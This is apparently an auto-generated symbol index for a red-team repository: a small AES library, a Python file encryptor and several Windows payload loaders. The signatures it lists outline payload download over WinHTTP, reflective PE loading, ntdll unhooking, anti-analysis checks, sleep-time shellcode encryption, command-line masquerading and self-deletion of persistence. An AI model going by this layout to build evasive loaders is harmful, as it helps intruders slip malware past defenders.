# Symbols

| Symbol | Kind | File:Line | Signature |
|--------|------|-----------|-----------|
| `AES_CBC_decrypt_buffer` | function | `aes.c:535` | `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)` |
| `AES_CBC_encrypt_buffer` | function | `aes.c:520` | `void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)` |
| `AES_CTR_xcrypt_buffer` | function | `aes.c:558` | `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)` |
| `AES_ECB_decrypt` | function | `aes.c:495` | `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)` |
| `AES_ECB_encrypt` | function | `aes.c:488` | `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)` |
| `AES_ctx_set_iv` | function | `aes.c:249` | `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)` |
| `AES_init_ctx` | function | `aes.c:238` | `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)` |
| `AES_init_ctx_iv` | function | `aes.c:244` | `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)` |
| `AddRoundKey` | function | `aes.c:257` | `static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)` |
| `BLOCKLEN` | macro | `aes.c:11` | `#define BLOCKLEN` |
| `Cipher` | function | `aes.c:433` | `static void Cipher(state_t* state, const uint8_t* RoundKey)` |
| `InvCipher` | function | `aes.c:459` | `static void InvCipher(state_t* state, const uint8_t* RoundKey)` |
| `InvMixColumns` | function | `aes.c:370` | `static void InvMixColumns(state_t* state)` |
| `InvShiftRows` | function | `aes.c:402` | `static void InvShiftRows(state_t* state)` |
| `InvSubBytes` | function | `aes.c:391` | `static void InvSubBytes(state_t* state)` |
| `KEYLEN_256` | macro | `aes.c:6` | `#define KEYLEN_256` |
| `KeyExpansion` | function | `aes.c:166` | `static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)` |
| `MULTIPLY_AS_A_FUNCTION` | macro | `aes.c:84` | `#define MULTIPLY_AS_A_FUNCTION` |
| `MixColumns` | function | `aes.c:320` | `static void MixColumns(state_t* state)` |
| `Multiply` | function | `aes.c:340` | `static uint8_t Multiply(uint8_t x, uint8_t y)` |
| `Multiply` | macro | `aes.c:349` | `#define Multiply(x, y)` |
| `Nb` | macro | `aes.c:4` | `#define Nb` |
| `Nb` | macro | `aes.c:67` | `#define Nb` |
| `Nk` | macro | `aes.c:70` | `#define Nk` |
| `Nk` | macro | `aes.c:73` | `#define Nk` |
| `Nk` | macro | `aes.c:76` | `#define Nk` |
| `Nr` | macro | `aes.c:71` | `#define Nr` |
| `Nr` | macro | `aes.c:74` | `#define Nr` |
| `Nr` | macro | `aes.c:77` | `#define Nr` |
| `RKLENGTH` | macro | `aes.c:10` | `#define RKLENGTH` |
| `ShiftRows` | function | `aes.c:286` | `static void ShiftRows(state_t* state)` |
| `SubBytes` | function | `aes.c:271` | `static void SubBytes(state_t* state)` |
| `Td0` | function | `aes.c:56` | `static uint8_t Td0(int x)` |
| `Td1` | function | `aes.c:58` | `static uint8_t Td1(int x)` |
| `Td2` | function | `aes.c:59` | `static uint8_t Td2(int x)` |
| `Td3` | function | `aes.c:60` | `static uint8_t Td3(int x)` |
| `Td4` | function | `aes.c:61` | `static uint8_t Td4(int x)` |
| `XorWithIv` | function | `aes.c:510` | `static void XorWithIv(uint8_t* buf, const uint8_t* Iv)` |
| `getSBoxInvert` | function | `aes.c:34` | `static uint8_t getSBoxInvert(uint8_t num)` |
| `getSBoxInvert` | macro | `aes.c:365` | `#define getSBoxInvert(num)` |
| `getSBoxValue` | function | `aes.c:12` | `static uint8_t getSBoxValue(uint8_t num)` |
| `getSBoxValue` | macro | `aes.c:163` | `#define getSBoxValue(num)` |
| `memcpy` | function | `aes.c:247` | `memcpy (ctx->Iv, iv, AES_BLOCKLEN);` |
| `xtime` | function | `aes.c:313` | `static uint8_t xtime(uint8_t x)` |
| `AES256` | macro | `aes.h:17` | `#define AES256` |
| `AES_BLOCKLEN` | macro | `aes.h:19` | `#define AES_BLOCKLEN` |
| `AES_CBC_decrypt_buffer` | function | `aes.h:54` | `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);` |
| `AES_CBC_encrypt_buffer` | function | `aes.h:53` | `void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);` |
| `AES_CTR_xcrypt_buffer` | function | `aes.h:58` | `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);` |
| `AES_ECB_decrypt` | function | `aes.h:49` | `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);` |
| `AES_ECB_encrypt` | function | `aes.h:48` | `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);` |
| `AES_KEYLEN` | macro | `aes.h:23` | `#define AES_KEYLEN` |
| `AES_KEYLEN` | macro | `aes.h:26` | `#define AES_KEYLEN` |
| `AES_KEYLEN` | macro | `aes.h:29` | `#define AES_KEYLEN` |
| `AES_ctx` | struct | `aes.h:33` | `` |
| `AES_ctx_set_iv` | function | `aes.h:44` | `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);` |
| `AES_init_ctx` | function | `aes.h:40` | `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);` |
| `AES_init_ctx_iv` | function | `aes.h:43` | `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);` |
| `AES_keyExpSize` | macro | `aes.h:24` | `#define AES_keyExpSize` |
| `AES_keyExpSize` | macro | `aes.h:27` | `#define AES_keyExpSize` |
| `AES_keyExpSize` | macro | `aes.h:30` | `#define AES_keyExpSize` |
| `CBC` | macro | `aes.h:9` | `#define CBC` |
| `CTR` | macro | `aes.h:15` | `#define CTR` |
| `ECB` | macro | `aes.h:12` | `#define ECB` |
| `_AES_H_` | macro | `aes.h:2` | `#define _AES_H_` |
| `AESencrypt` | function | `crypter.py:9` | `def AESencrypt(plaintext, key)` |
| `change_ext` | function | `crypter.py:19` | `def change_ext(filename, new_ext)` |
| `main` | function | `crypter.py:24` | `def main()` |
| `12` | type_alias | `loader.c:40` | `typedef struct _BASE_RELOCATION_ENTRY { WORD Offset : 12;` |
| `BitReader` | struct | `loader.c:58` | `` |
| `CloseHandle` | function | `loader.c:295` | `CloseHandle(pi.hThread);` |
| `CryptSetKeyParam` | function | `loader.c:657` | `CryptSetKeyParam(hKey, KP_IV, iv, 0);` |
| `DATA` | struct | `loader.c:46` | `` |
| `DecryptAES` | function | `loader.c:637` | `void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen)` |
| `EI` | macro | `loader.c:52` | `#define EI` |
| `EJ` | macro | `loader.c:53` | `#define EJ` |
| `ExitProcess` | function | `loader.c:303` | `ExitProcess(0);` |
| `ExitThread` | function | `loader.c:320` | `ExitThread(0);` |
| `F` | macro | `loader.c:56` | `#define F` |
| `GetData` | function | `loader.c:670` | `DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource)` |
| `GetNTHeaders` | function | `loader.c:381` | `char* GetNTHeaders(char* pe_buffer)` |
| `GetPEDirectory` | function | `loader.c:393` | `IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)` |
| `LocalFree` | function | `loader.c:349` | `LocalFree(poi_masqArgvW);` |
| `MultiByteToWideChar` | function | `loader.c:332` | `MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);` |
| `N` | macro | `loader.c:55` | `#define N` |
| `NTSTATUS` | type_alias | `loader.c:38` | `typedef LONG NTSTATUS;` |
| `NTSTATUS` | function | `loader.c:501` | `typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);` |
| `NT_SUCCESS` | macro | `loader.c:30` | `#define NT_SUCCESS(Status)` |
| `NtCurrentProcess` | macro | `loader.c:34` | `#define NtCurrentProcess()` |
| `NtCurrentThread` | macro | `loader.c:32` | `#define NtCurrentThread()` |
| `NtUnmapViewOfSection` | function | `loader.c:504` | `NtUnmapViewOfSection(NtCurrentProcess(), preferAddr);` |
| `P` | macro | `loader.c:54` | `#define P` |
| `PELoader` | function | `loader.c:484` | `void PELoader(char* data, DWORD datasize)` |
| `RegCloseKey` | function | `loader.c:235` | `RegCloseKey(hKey);` |
| `RegDeleteValueA` | function | `loader.c:266` | `RegDeleteValueA(hKey, "SystemMaintenance");` |
| `RepairIAT` | function | `loader.c:403` | `BOOL RepairIAT(PVOID modulePtr)` |
| `RunPE` | function | `loader.c:478` | `DWORD WINAPI RunPE(LPVOID lpParameter)` |
| `Sleep` | function | `loader.c:860` | `Sleep(3000);` |
| `TerminateProcess` | function | `loader.c:572` | `TerminateProcess(pi.hProcess, 0);` |
| `Unhook` | function | `loader.c:601` | `BOOL Unhook(LPVOID cleanNtdll)` |
| `VirtualFree` | function | `loader.c:524` | `VirtualFree(pImageBase, 0, MEM_RELEASE);` |
| `WaitForSingleObject` | function | `loader.c:550` | `WaitForSingleObject(hThread, INFINITE);` |
| `WideCharToMultiByte` | function | `loader.c:679` | `WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);` |
| `WinHttpCloseHandle` | function | `loader.c:692` | `WinHttpCloseHandle(hSession);` |
| `WinHttpSetOption` | function | `loader.c:723` | `WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));` |
| `ZeroMemory` | function | `loader.c:747` | `ZeroMemory(pszOutBuffer, dwSize + 1);` |
| `_BASE_RELOCATION_ENTRY` | struct | `loader.c:41` | `` |
| `_CRT_RAND_S` | macro | `loader.c:19` | `#define _CRT_RAND_S` |
| `_CRT_SECURE_NO_WARNINGS` | macro | `loader.c:37` | `#define _CRT_SECURE_NO_WARNINGS` |
| `_stricmp` | function | `loader.c:458` | `_stricmp(func_name, "exit") == 0 \|\|
                    _stricmp(func_name, "_Exit") == 0 \|\|
    ...` |
| `anti_analysis` | function | `loader.c:226` | `BOOL anti_analysis()` |
| `entryPoint` | function | `loader.c:481` | `entryPoint();` |
| `ep` | function | `loader.c:555` | `ep();` |
| `fflush` | function | `loader.c:253` | `fflush(stdout);` |
| `free` | function | `loader.c:109` | `free(window);` |
| `freeargvA` | function | `loader.c:365` | `void freeargvA(char** array, int Argc)` |
| `freeargvW` | function | `loader.c:373` | `void freeargvW(wchar_t** array, int Argc)` |
| `getNtdll` | function | `loader.c:558` | `LPVOID getNtdll()` |
| `hookExitProcess` | function | `loader.c:323` | `void __stdcall hookExitProcess(UINT statuscode)` |
| `hookGetCommandLineA` | function | `loader.c:218` | `LPSTR hookGetCommandLineA()` |
| `hookGetCommandLineW` | function | `loader.c:217` | `LPWSTR hookGetCommandLineW()` |
| `hook__getmainargs` | function | `loader.c:312` | `int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)` |
| `hook__p___argc` | function | `loader.c:221` | `int* __cdecl hook__p___argc(void)` |
| `hook__p___argv` | function | `loader.c:219` | `char*** __cdecl hook__p___argv(void)` |
| `hook__p___wargv` | function | `loader.c:220` | `wchar_t*** __cdecl hook__p___wargv(void)` |
| `hook__wgetmainargs` | function | `loader.c:306` | `int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)` |
| `hookexit` | function | `loader.c:318` | `int __cdecl hookexit(int status)` |
| `lzss_decode_mem` | function | `loader.c:84` | `BOOL lzss_decode_mem(const unsigned char* input, size_t input_size, unsigned char** output, size_...` |
| `main` | function | `loader.c:791` | `int main(int argc, char** argv)` |
| `masqueradeCmdline` | function | `loader.c:327` | `void masqueradeCmdline()` |
| `memcpy` | function | `loader.c:518` | `memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);` |
| `printf` | function | `loader.c:252` | `printf("[*] Initiating self-destruct...\n");` |
| `read_bit` | function | `loader.c:63` | `static int read_bit(BitReader* br)` |
| `read_bits` | function | `loader.c:74` | `static int read_bits(BitReader* br, int n)` |
| `selfDestruct` | function | `loader.c:251` | `void selfDestruct()` |
| `srand` | function | `loader.c:793` | `srand(GetTickCount());` |
| `system` | function | `loader.c:271` | `system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");` |
| `wprintf` | function | `loader.c:680` | `wprintf(L"[*] Downloading: %s (%s)\n", wresource, resourceA);` |
| `AddVectoredExceptionHandler` | function | `loader2.c:760` | `AddVectoredExceptionHandler(1, VEHHandler);` |
| `BitReader` | struct | `loader2.c:46` | `` |
| `CloseHandle` | function | `loader2.c:589` | `CloseHandle(hThread);` |
| `CryptSetKeyParam` | function | `loader2.c:84` | `CryptSetKeyParam(hKey, KP_IV, iv, 0);` |
| `DATA` | struct | `loader2.c:134` | `` |
| `DWORD` | function | `loader2.c:127` | `typedef DWORD (NTAPI *typeNtFlushInstructionCache)(HANDLE, PVOID, ULONG);` |
| `DecryptAES` | function | `loader2.c:70` | `void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen)` |
| `EI` | macro | `loader2.c:40` | `#define EI` |
| `EJ` | macro | `loader2.c:41` | `#define EJ` |
| `ExitProcess` | function | `loader2.c:644` | `ExitProcess(0);` |
| `F` | macro | `loader2.c:44` | `#define F` |
| `FluctuationMetadata` | struct | `loader2.c:111` | `` |
| `GetData` | function | `loader2.c:646` | `DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource)` |
| `GetNTHeaders` | function | `loader2.c:418` | `char* GetNTHeaders(char* pe_buffer)` |
| `GetPEDirectory` | function | `loader2.c:429` | `IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)` |
| `GetProcAddress` | function | `loader2.c:296` | `GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");` |
| `GlobalMemoryStatusEx` | function | `loader2.c:613` | `GlobalMemoryStatusEx(&mem);` |
| `HookTrampolineBuffers` | struct | `loader2.c:119` | `` |
| `HookedSleep` | struct | `loader2.c:129` | `` |
| `LocalFree` | function | `loader2.c:404` | `LocalFree(poi_masqArgvW);` |
| `MultiByteToWideChar` | function | `loader2.c:393` | `MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);` |
| `MySleep` | function | `loader2.c:246` | `static void WINAPI MySleep(DWORD ms)` |
| `N` | macro | `loader2.c:43` | `#define N` |
| `NTSTATUS` | function | `loader2.c:518` | `typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);` |
| `NT_SUCCESS` | macro | `loader2.c:29` | `#define NT_SUCCESS(Status)` |
| `NtCurrentProcess` | macro | `loader2.c:33` | `#define NtCurrentProcess()` |
| `NtCurrentThread` | macro | `loader2.c:31` | `#define NtCurrentThread()` |
| `P` | macro | `loader2.c:42` | `#define P` |
| `PELoader` | function | `loader2.c:508` | `void PELoader(char* data, DWORD datasize)` |
| `RegCloseKey` | function | `loader2.c:605` | `RegCloseKey(hKey);` |
| `RegDeleteValueA` | function | `loader2.c:625` | `RegDeleteValueA(hKey, "SystemMaintenance");` |
| `RepairIAT` | function | `loader2.c:438` | `BOOL RepairIAT(PVOID modulePtr)` |
| `RunPE` | function | `loader2.c:502` | `DWORD WINAPI RunPE(LPVOID lpParameter)` |
| `Sleep` | function | `loader2.c:256` | `Sleep(ms);` |
| `UNICODE` | macro | `loader2.c:36` | `#define UNICODE` |
| `UPTR` | type_alias | `loader2.c:100` | `typedef UINT64 UPTR;` |
| `UPTR` | type_alias | `loader2.c:102` | `typedef UINT32 UPTR;` |
| `VEHHandler` | function | `loader2.c:302` | `LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)` |
| `VirtualFree` | function | `loader2.c:536` | `VirtualFree(pImageBase, 0, MEM_RELEASE);` |
| `VirtualProtect` | function | `loader2.c:218` | `VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_READWRITE, &old);` |
| `WIN32_LEAN_AND_MEAN` | macro | `loader2.c:2` | `#define WIN32_LEAN_AND_MEAN` |
| `WIN32_LEAN_AND_MEAN` | macro | `loader2.c:34` | `#define WIN32_LEAN_AND_MEAN` |
| `WaitForSingleObject` | function | `loader2.c:588` | `WaitForSingleObject(hThread, INFINITE);` |
| `WideCharToMultiByte` | function | `loader2.c:654` | `WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);` |
| `WinHttpCloseHandle` | function | `loader2.c:677` | `WinHttpCloseHandle(hRequest);` |
| `WinHttpSetOption` | function | `loader2.c:672` | `WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));` |
| `ZeroMemory` | function | `loader2.c:691` | `ZeroMemory(pszOutBuffer, dwSize + 1);` |
| `_CRT_RAND_S` | macro | `loader2.c:1` | `#define _CRT_RAND_S` |
| `_CRT_SECURE_NO_WARNINGS` | macro | `loader2.c:26` | `#define _CRT_SECURE_NO_WARNINGS` |
| `_UNICODE` | macro | `loader2.c:37` | `#define _UNICODE` |
| `anti_analysis` | function | `loader2.c:596` | `BOOL anti_analysis()` |
| `entryPoint` | function | `loader2.c:505` | `entryPoint();` |
| `fastTrampoline` | function | `loader2.c:261` | `bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)` |
| `free` | function | `loader2.c:379` | `free(window);` |
| `freeargvA` | function | `loader2.c:169` | `void freeargvA(char** array, int Argc);` |
| `freeargvW` | function | `loader2.c:170` | `void freeargvW(wchar_t** array, int Argc);` |
| `get_return_address` | function | `loader2.c:182` | `static inline UPTR get_return_address(void)` |
| `hookExitProcess` | function | `loader2.c:501` | `void __stdcall hookExitProcess(UINT statuscode)` |
| `hookGetCommandLineA` | function | `loader2.c:490` | `LPSTR hookGetCommandLineA()` |
| `hookGetCommandLineW` | function | `loader2.c:491` | `LPWSTR hookGetCommandLineW()` |
| `hook__getmainargs` | function | `loader2.c:495` | `int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)` |
| `hook__p___argc` | function | `loader2.c:494` | `int* __cdecl hook__p___argc(void)` |
| `hook__p___argv` | function | `loader2.c:492` | `char*** __cdecl hook__p___argv(void)` |
| `hook__p___wargv` | function | `loader2.c:493` | `wchar_t*** __cdecl hook__p___wargv(void)` |
| `hook__wgetmainargs` | function | `loader2.c:498` | `int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)` |
| `isShellcodeThread` | function | `loader2.c:195` | `bool isShellcodeThread(LPVOID addr)` |
| `log` | macro | `loader2.c:153` | `#define log(...)` |
| `log` | function | `loader2.c:222` | `log("[>] Flipped to RW");` |
| `lzss_decode_mem` | function | `loader2.c:323` | `BOOL lzss_decode_mem(const unsigned char* input, size_t input_size, unsigned char** output, size_...` |
| `main` | function | `loader2.c:731` | `int main(int argc, char** argv)` |
| `masqueradeCmdline` | function | `loader2.c:387` | `void masqueradeCmdline()` |
| `memcpy` | function | `loader2.c:271` | `memcpy(code + 2, &jump, 8);` |
| `printf` | function | `loader2.c:87` | `printf("[-] CryptDecrypt failed: %u\n", GetLastError());` |
| `read_bit` | function | `loader2.c:51` | `static int read_bit(BitReader* br)` |
| `read_bits` | function | `loader2.c:60` | `static int read_bits(BitReader* br, int n)` |
| `selfDestruct` | function | `loader2.c:617` | `void selfDestruct()` |
| `shellcodeEncryptDecrypt` | function | `loader2.c:206` | `void shellcodeEncryptDecrypt(LPVOID caller)` |
| `srand` | function | `loader2.c:733` | `srand(GetTickCount());` |
| `system` | function | `loader2.c:628` | `system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");` |
| `void` | function | `loader2.c:125` | `typedef void (WINAPI *typeSleep)(DWORD ms);` |
| `wprintf` | function | `loader2.c:655` | `wprintf(L"[*] Downloading: %s (%s)\n", wresource, resourceA);` |
| `xor32` | function | `loader2.c:186` | `void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)` |
| `AddVectoredExceptionHandler` | function | `loader3.c:792` | `AddVectoredExceptionHandler(1, VEHHandler);` |
| `BitReader` | struct | `loader3.c:58` | `` |
| `CloseHandle` | function | `loader3.c:574` | `CloseHandle(hThread);` |
| `Copyright` | function | `loader3.c:13` | `Copyright (c) LazyOwn RedTeam 2025. All rights reserved. */ #define _CRT_RAND_S #define WIN32_LEAN_AND_MEAN #include <wi` |
| `CryptSetKeyParam` | function | `loader3.c:150` | `CryptSetKeyParam(hKey, KP_IV, iv, 0);` |
| `DATA` | struct | `loader3.c:197` | `` |
| `DWORD` | function | `loader3.c:190` | `typedef DWORD (NTAPI *typeNtFlushInstructionCache)(HANDLE, PVOID, ULONG);` |
| `DecryptAES` | function | `loader3.c:138` | `void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen)` |
| `EI` | macro | `loader3.c:52` | `#define EI` |
| `EJ` | macro | `loader3.c:53` | `#define EJ` |
| `ExitProcess` | function | `loader3.c:625` | `ExitProcess(0);` |
| `ExitThread` | function | `loader3.c:490` | `ExitThread(0);` |
| `F` | macro | `loader3.c:56` | `#define F` |
| `FluctuationMetadata` | struct | `loader3.c:174` | `` |
| `GetData` | function | `loader3.c:689` | `DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource)` |
| `GetNTHeaders` | function | `loader3.c:405` | `char* GetNTHeaders(char* pe_buffer)` |
| `GetPEDirectory` | function | `loader3.c:416` | `IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)` |
| `GetProcAddress` | function | `loader3.c:336` | `GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");` |
| `GlobalMemoryStatusEx` | function | `loader3.c:597` | `GlobalMemoryStatusEx(&mem);` |
| `HookTrampolineBuffers` | struct | `loader3.c:182` | `` |
| `HookedSleep` | struct | `loader3.c:192` | `` |
| `LocalFree` | function | `loader3.c:375` | `LocalFree(poi_masqArgvW);` |
| `MultiByteToWideChar` | function | `loader3.c:365` | `MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);` |
| `MySleep` | function | `loader3.c:291` | `static void WINAPI MySleep(DWORD ms)` |
| `N` | macro | `loader3.c:55` | `#define N` |
| `NTSTATUS` | function | `loader3.c:511` | `typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);` |
| `NT_SUCCESS` | macro | `loader3.c:45` | `#define NT_SUCCESS(Status)` |
| `NtCurrentProcess` | macro | `loader3.c:49` | `#define NtCurrentProcess()` |
| `NtCurrentThread` | macro | `loader3.c:47` | `#define NtCurrentThread()` |
| `P` | macro | `loader3.c:54` | `#define P` |
| `PELoader` | function | `loader3.c:502` | `void PELoader(char* data, DWORD datasize)` |
| `RegCloseKey` | function | `loader3.c:589` | `RegCloseKey(hKey);` |
| `RegDeleteValueA` | function | `loader3.c:608` | `RegDeleteValueA(hKey, "SystemMaintenance");` |
| `RepairIAT` | function | `loader3.c:425` | `BOOL RepairIAT(PVOID modulePtr)` |
| `RunPE` | function | `loader3.c:496` | `DWORD WINAPI RunPE(LPVOID lpParameter)` |
| `Sleep` | function | `loader3.c:300` | `Sleep(ms);` |
| `TerminateProcess` | function | `loader3.c:639` | `TerminateProcess(pi.hProcess, 0);` |
| `UPTR` | type_alias | `loader3.c:163` | `typedef UINT64 UPTR;` |
| `UPTR` | type_alias | `loader3.c:165` | `typedef UINT32 UPTR;` |
| `Unhook` | function | `loader3.c:664` | `BOOL Unhook(LPVOID cleanNtdll)` |
| `VEHHandler` | function | `loader3.c:341` | `LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)` |
| `VirtualFree` | function | `loader3.c:526` | `VirtualFree(pImageBase, 0, MEM_RELEASE);` |
| `VirtualProtect` | function | `loader3.c:268` | `VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_READWRITE, &old);` |
| `WIN32_LEAN_AND_MEAN` | macro | `loader3.c:17` | `#define WIN32_LEAN_AND_MEAN` |
| `WaitForSingleObject` | function | `loader3.c:573` | `WaitForSingleObject(hThread, INFINITE);` |
| `WideCharToMultiByte` | function | `loader3.c:695` | `WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);` |
| `WinHttpCloseHandle` | function | `loader3.c:712` | `WinHttpCloseHandle(hRequest);` |
| `WinHttpSetOption` | function | `loader3.c:708` | `WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));` |
| `ZeroMemory` | function | `loader3.c:724` | `ZeroMemory(pszOutBuffer, dwSize + 1);` |
| `_CRT_RAND_S` | macro | `loader3.c:15` | `#define _CRT_RAND_S` |
| `_CRT_SECURE_NO_WARNINGS` | macro | `loader3.c:42` | `#define _CRT_SECURE_NO_WARNINGS` |
| `anti_analysis` | function | `loader3.c:581` | `BOOL anti_analysis()` |
| `entryPoint` | function | `loader3.c:499` | `entryPoint();` |
| `fastTrampoline` | function | `loader3.c:305` | `bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)` |
| `free` | function | `loader3.c:133` | `free(window);` |
| `freeargvA` | function | `loader3.c:389` | `void freeargvA(char** array, int Argc)` |
| `freeargvW` | function | `loader3.c:397` | `void freeargvW(wchar_t** array, int Argc)` |
| `getNtdll` | function | `loader3.c:629` | `LPVOID getNtdll()` |
| `get_return_address` | function | `loader3.c:238` | `static inline UPTR get_return_address(void)` |
| `hookExitProcess` | function | `loader3.c:493` | `void __stdcall hookExitProcess(UINT statuscode)` |
| `hookGetCommandLineA` | function | `loader3.c:478` | `LPSTR hookGetCommandLineA()` |
| `hookGetCommandLineW` | function | `loader3.c:479` | `LPWSTR hookGetCommandLineW()` |
| `hook__getmainargs` | function | `loader3.c:483` | `int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)` |
| `hook__p___argc` | function | `loader3.c:482` | `int* __cdecl hook__p___argc(void)` |
| `hook__p___argv` | function | `loader3.c:480` | `char*** __cdecl hook__p___argv(void)` |
| `hook__p___wargv` | function | `loader3.c:481` | `wchar_t*** __cdecl hook__p___wargv(void)` |
| `hook__wgetmainargs` | function | `loader3.c:486` | `int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)` |
| `hookexit` | function | `loader3.c:489` | `int __cdecl hookexit(int status)` |
| `isShellcodeThread` | function | `loader3.c:248` | `bool isShellcodeThread(LPVOID addr)` |
| `log` | macro | `loader3.c:214` | `#define log(...)` |
| `log` | function | `loader3.c:272` | `log("[>] Flipped to RW");` |
| `lzss_decode_mem` | function | `loader3.c:82` | `BOOL lzss_decode_mem(const unsigned char* input, size_t input_size, unsigned char** output, size_...` |
| `main` | function | `loader3.c:757` | `int main(int argc, char** argv)` |
| `masqueradeCmdline` | function | `loader3.c:360` | `void masqueradeCmdline()` |
| `memcpy` | function | `loader3.c:314` | `memcpy(code + 2, &jump, 8);` |
| `printf` | function | `loader3.c:152` | `printf("[-] CryptDecrypt failed: %u\n", GetLastError());` |
| `read_bit` | function | `loader3.c:63` | `static int read_bit(BitReader* br)` |
| `read_bits` | function | `loader3.c:72` | `static int read_bits(BitReader* br, int n)` |
| `selfDestruct` | function | `loader3.c:601` | `void selfDestruct()` |
| `shellcodeEncryptDecrypt` | function | `loader3.c:257` | `void shellcodeEncryptDecrypt(LPVOID caller)` |
| `srand` | function | `loader3.c:758` | `srand(GetTickCount());` |
| `system` | function | `loader3.c:611` | `system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");` |
| `void` | function | `loader3.c:188` | `typedef void (WINAPI *typeSleep)(DWORD ms);` |
| `wprintf` | function | `loader3.c:696` | `wprintf(L"[*] Downloading: %s (%s)\n", wresource, resourceA);` |
| `xor32` | function | `loader3.c:241` | `void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)` |
| `AddVectoredExceptionHandler` | function | `loader4.c:921` | `AddVectoredExceptionHandler(1, VEHHandler);` |
| `BitReader` | struct | `loader4.c:98` | `` |
| `CloseHandle` | function | `loader4.c:692` | `CloseHandle(hThread);` |
| `Copyright` | function | `loader4.c:13` | `Copyright (c) LazyOwn RedTeam 2025. All rights reserved. */ #define _CRT_RAND_S #define WIN32_LEAN_AND_MEAN #include <wi` |
| `CryptSetKeyParam` | function | `loader4.c:263` | `CryptSetKeyParam(hKey, KP_IV, iv, 0);` |
| `DATA` | struct | `loader4.c:310` | `` |
| `DWORD` | function | `loader4.c:303` | `typedef DWORD (NTAPI *typeNtFlushInstructionCache)(HANDLE, PVOID, ULONG);` |
| `DecryptAES` | function | `loader4.c:250` | `void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen)` |
| `EI` | macro | `loader4.c:62` | `#define EI` |
| `EJ` | macro | `loader4.c:63` | `#define EJ` |
| `ExitProcess` | function | `loader4.c:743` | `ExitProcess(0);` |
| `ExitThread` | function | `loader4.c:606` | `ExitThread(0);` |
| `F` | macro | `loader4.c:66` | `#define F` |
| `FluctuationMetadata` | struct | `loader4.c:287` | `` |
| `GetData` | function | `loader4.c:811` | `DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource)` |
| `GetNTHeaders` | function | `loader4.c:521` | `char* GetNTHeaders(char* pe_buffer)` |
